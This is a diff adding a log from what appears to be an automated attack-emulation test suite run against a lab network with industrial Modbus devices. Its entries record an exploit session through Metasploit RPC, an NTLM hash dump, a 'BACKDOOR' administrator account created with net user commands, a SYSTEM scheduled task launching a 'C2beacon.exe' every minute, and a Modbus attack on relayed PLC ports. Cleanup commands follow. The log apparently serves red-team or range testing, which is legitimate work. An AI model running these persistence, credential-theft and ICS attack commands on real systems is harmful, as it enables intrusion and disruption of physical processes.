@@ -1,0 +1,62 @@
+Warning all old txt files are deleted! Do not store txt in this dir
+limiting tests to scope inet
+Mon Nov 21 19:46:32 UTC 2022
+local inet eb_cleanup.01  cleanup in case we had a bad stop last time
+Mon Nov 21 19:46:40 UTC 2022
+{"data"=>"[*] Local TCP relay created: :5001 <-> 192.168.100.1:502\n[*] Local TCP relay created: :5002 <-> 192.168.100.2:502\n[*] Local TCP relay created: :5003 <-> 192.168.100.3:502\n[*] Local TCP relay created: :5004 <-> 192.168.100.4:502\n[*] Local TCP relay created: :5005 <-> 192.168.100.5:502\n[*] Local TCP relay created: :5006 <-> 192.168.100.6:502\n[*] Local TCP relay created: :5007 <-> 192.168.100.7:502\n[*] Local TCP relay created: :5008 <-> 192.168.100.8:502\n[*] Local TCP relay created: :5009 <-> 192.168.100.9:502\n[*] Local TCP relay created: :5010 <-> 192.168.100.10:502\n[*] Local TCP relay created: :5011 <-> 192.168.100.11:502\n[*] Local TCP relay created: :5012 <-> 192.168.100.12:502\n[*] Local TCP relay created: :5013 <-> 192.168.100.13:502\n[*] Local TCP relay created: :5014 <-> 192.168.100.14:502\n[*] Local TCP relay created: :5015 <-> 192.168.100.15:502\n[*] Local TCP relay created: :5016 <-> 192.168.100.16:502\n[*] Local TCP relay created: :5017 <-> 192.168.100.17:502\n[*] Local TCP relay created: :5018 <-> 192.168.100.18:502\n[*] Local TCP relay created: :5019 <-> 192.168.100.19:502\n[*] Local TCP relay created: :5020 <-> 192.168.100.20:502\n[*] Running Command List ...\n[*] running command net user BACKDOOR /delete\n[*] tThe command completed successfully.\r\n\n[*] t\r\n\n[*] running command schtasks /delete /f /tn \"beacon\"\n[*] tSUCCESS: The scheduled task \"beacon\" was successfully deleted.\r\n\n"}
+TEST PASS
+Mon Nov 21 19:46:40 UTC 2022
+local inet eb_startup.01  establish vpn and start msfrpcd
+Mon Nov 21 19:46:48 UTC 2022
+64 bytes from 192.168.100.100: icmp_seq=1 ttl=126 time=6.98 ms
+64 bytes from 192.168.100.100: icmp_seq=2 ttl=126 time=5.47 ms
+TEST PASS
+Mon Nov 21 19:46:48 UTC 2022
+local inet nmap.01  nmap windows site controller
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:46:50 UTC 2022
+RDP PORTS = 1
+TEST PASS
+Mon Nov 21 19:46:50 UTC 2022
+local inet eb.01  do eb attack and create session in msfrpc
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:47:10 UTC 2022
+TEST FAIL
+Mon Nov 21 19:47:10 UTC 2022
+local inet eb.01  do eb attack and create session in msfrpc
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:47:30 UTC 2022
+TEST PASS
+Mon Nov 21 19:47:30 UTC 2022
+local inet eb_session_migrate.02
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:47:40 UTC 2022
+[-] Process already running at PID 752
+TEST PASS
+Mon Nov 21 19:47:40 UTC 2022
+local inet eb_hashdump.02a
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:47:49 UTC 2022
+admin:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+TEST PASS
+Mon Nov 21 19:47:49 UTC 2022
+local inet eb_add_user.03
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:47:57 UTC 2022
+{"data"=>"[*] Running Command List ...\n[*] running command net user /add BACKDOOR hacker$\n[*] tThe command completed successfully.\r\n\n[*] t\r\n\n[*] running command net localgroup administrators BACKDOOR /add\n[*] tThe command completed successfully.\r\n\n[*] t\r\n\n[*] running command net localgroup administrators\n[*] tAlias name     administrators\r\nComment        Administrators have complete and unrestricted access to the computer/domain\r\n\r\nMembers\r\n\r\n-------------------------------------------------------------------------------\r\nadmin\r\nAdministrator\r\nBACKDOOR\r\nThe command completed successfully.\r\n\r\n\n"}
+TEST PASS
+Mon Nov 21 19:47:57 UTC 2022
+local inet eb_schedule_task.04
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:48:05 UTC 2022
+{"data"=>"[*] Running Command List ...\n[*] running command schtasks /Create /tn \"beacon\" /sc MINUTE /mo 1 /ru \"SYSTEM\" /tr \"C:\\Windows\\Systems32\\C2beacon.exe\"\n[*] tSUCCESS: The scheduled task \"beacon\" has successfully been created.\r\n\n"}
+TEST PASS
+Mon Nov 21 19:48:05 UTC 2022
+local inet eb_modbus_attack.05
+http://172.16.60.55:9200/tests-2022-11-21/_doc
+Mon Nov 21 19:51:05 UTC 2022
+TEST PASS
+------------------------
+Done in 273 seconds
